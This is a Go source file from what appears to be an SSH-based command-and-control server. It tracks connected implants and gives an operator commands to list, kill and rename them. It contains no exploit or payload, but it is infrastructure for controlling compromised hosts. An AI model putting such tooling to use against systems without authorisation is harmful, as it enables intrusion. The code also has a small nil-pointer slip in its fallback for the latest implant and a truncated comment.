package main

/*
 * implants.go
 * Wrangle implants
 * By J. Stuart McMurray
 * Created 20220522
 * Last Modified 20220524
 */

import (
	"errors"
	"fmt"
	"io"
	"log"
	"sort"
	"sync"
	"text/tabwriter"
	"time"

	"github.com/magisterquis/jec2/cmd/internal/common"
	"github.com/magisterquis/simpleshsplit"
	"golang.org/x/crypto/ssh"
)

const (
	/* latestImplantName is the pseudoname for the implant which most
	recently connected (which may not still be connected). */
	latestImplantName = "latest"

	/* implantDieWait is the amount of time to wait for an implant to
	promise to die after asking it to and to die after it says it will. */
	implantDieWait = time.Minute
)

var (
	/* implants holds the connected implants. */
	implants      = make(map[string]*Implant)
	latestImplant *Implant
	implantsL     sync.RWMutex
)

// CopyImplants gets a copy of implants.
func CopyImplants() map[string]*Implant {
	implantsL.RLock()
	defer implantsL.RUnlock()
	m := make(map[string]*Implant)
	for k, v := range implants {
		m[k] = v
	}
	return m
}

// HandleImplant handles a connection from an implant.
func HandleImplant(
	name Tag,
	sc *ssh.ServerConn,
	chans <-chan ssh.NewChannel,
	reqs <-chan *ssh.Request,
) {
	/* We'll need this for its methods, even if we don't keep it. */
	imp := &Implant{
		C:    sc,
		when: time.Now(),
		name: name.String(),
	}
	tag := Tag{s: imp}

	/* There should be no incoming channels. */
	go func() {
		n := 0
		for nc := range chans {
			ctag := tag.Append("c%d", n)
			n++
			log.Printf(
				"[%s] ACHTUNG! Unexpected new %q channel "+
					"request; this should never happen",
				ctag,
				nc.ChannelType(),
			)
			nc.Reject(
				ssh.Prohibited,
				fmt.Sprintf(
					"%s channels prohibited; see "+
						"https://www.youtube.com/"+
						"watch?v=dQw4w9WgXcQ for "+
						"more details.",
					nc.ChannelType(),
				),
			)
		}
	}()

	/* Incoming requests may be used eventually for metadata. */
	go func() {
		n := 0
		for req := range reqs {
			rtag := tag.Append("r%d", n)
			switch req.Type {
			case common.LogMessage:
				log.Printf("[%s] Log: %s", tag, req.Payload)
				req.Reply(true, nil)
			default:
				log.Printf(
					"[%s] ACHTUNG! Unexpected %q "+
						"request; this should never "+
						"happen",
					rtag,
					req.Type,
				)
				req.Reply(false, []byte(
					"https://www.youtube.com/watch?"+
						"v=dQw4w9WgXcQ",
				))
			}
		}
	}()

	/* Give implant a list of allowed fingerprints. */
	if err := imp.SetAllowedOperatorFingerprints(); nil != err {
		log.Printf(
			"[%s] Error setting allowed fingerprints: %s",
			tag,
			err,
		)
		return
	}

	/* Save implant for tunneling. */
	implantsL.Lock()
	if _, ok := implants[imp.Name()]; ok {
		/* Should never have duplicate implant names. */
		panic(fmt.Sprintf(
			"duplicate implant name %s found",
			imp.Name(),
		))
	}
	implants[imp.Name()] = imp
	latestImplant = imp
	implantsL.Unlock()

	/* Wait for connection to finish and forget implant. */
	werr := sc.Wait()
	implantsL.Lock()
	delete(implants, imp.Name())
	if imp == latestImplant {
		/* If this was the latest implant, switch the latest implant
		to the next-latest implant. */
		latestImplant = nil /* Default to no implant. */
		for _, sci := range implants {
			if sci.When().After(latestImplant.When()) {
				latestImplant = sci
			}
		}
	}
	implantsL.Unlock()

	if nil != werr && !errors.Is(werr, io.EOF) {
		log.Printf("[%s] Disconnected with error: %s", tag, werr)
		return
	}
	log.Printf("[%s] Disconnected", tag)
}

// GetImplant gets an implant by name.  The special name latestImplantName may
// also be used.
func GetImplant(name string) (*Implant, bool) {
	implantsL.RLock()
	defer implantsL.RUnlock()

	/* If we just want the latest implant, do that. */
	if latestImplantName == name {
		if nil != latestImplant {
			return latestImplant, true
		}
		/* May have died. */
		return nil, false
	}

	/* Try to get the implant by name. */
	imp, ok := implants[name]
	if !ok {
		return nil, false
	}
	return imp, true
}

// RemoveImplant removes an
// AllImplants runs f on all implants in its own goroutine.
func AllImplants(f func(imp *Implant)) {
	imps := CopyImplants()
	for _, imp := range imps {
		go f(imp)
	}
}

// CommandKillImplant is a command handler which kills the named implant.
func CommandKillImplant(lm MessageLogf, ch ssh.Channel, arg string) error {
	imp, ok := GetImplant(arg)
	if !ok {
		return fmt.Errorf("no implant named %q", arg)
	}
	if err := imp.Close(); nil != err {
		return fmt.Errorf("killing %s: %w", arg, err)
	}
	return nil
}

// CommandListImplants lists the currently-connected implants.
func CommandListImplants(lm MessageLogf, ch ssh.Channel, args string) error {
	/* Make a list of implants sorted by connection time. */
	imps := CopyImplants()
	if 0 == len(implants) {
		fmt.Fprintf(ch, "No connected implants\n")
		return nil
	}
	l := make([]*Implant, 0, len(imps))
	for _, imp := range imps {
		l = append(l, imp)
	}
	sort.Slice(l, func(i, j int) bool {
		return l[i].When().Before(l[j].When())
	})

	/* Print a nice table. */
	tw := tabwriter.NewWriter(ch, 2, 8, 2, ' ', 0)
	defer tw.Flush()
	fmt.Fprintf(tw, "Implant\tUsername\tAddress\tConnected\n")
	fmt.Fprintf(tw, "-------\t--------\t-------\t---------\n")
	for _, imp := range l {
		fmt.Fprintf(
			tw,
			"%s\t%s\t%s\t%s\n",
			imp.Name(),
			imp.C.User(),
			imp.C.RemoteAddr(),
			imp.When().Format(time.RFC3339),
		)
	}

	return nil
}

// CommandRenameImplant renames an implant.
func CommandRenameImplant(lm MessageLogf, ch ssh.Channel, args string) error {
	/* Get the source and dst names. */
	parts := simpleshsplit.Split(args)
	if 2 != len(parts) {
		return fmt.Errorf("need exactly two names")
	}
	src, dst := parts[0], parts[1]

	/* Work out which implant to rename. */
	imp, ok := GetImplant(src)
	if !ok {
		return fmt.Errorf("no implant named %q", src)
	}
	src = imp.Name() /* In case of latest. */

	/* Replace the old implant with the new one. */
	implantsL.Lock()
	defer implantsL.Unlock()

	/* Make sure there's not already an implant with the name. */
	if _, ok := implants[dst]; ok {
		return fmt.Errorf("implant %q already exists", dst)
	}
	imp.SetName(dst)

	/* Make sure we didn't lose the old one. */
	if _, ok := implants[src]; !ok {
		return fmt.Errorf("implant %q no longer exists", src)
	}

	/* Do the rename. */
	implants[dst] = imp
	delete(implants, src)

	fmt.Fprintf(ch, "Renamed %s -> %s\n", src, dst)

	return nil
}
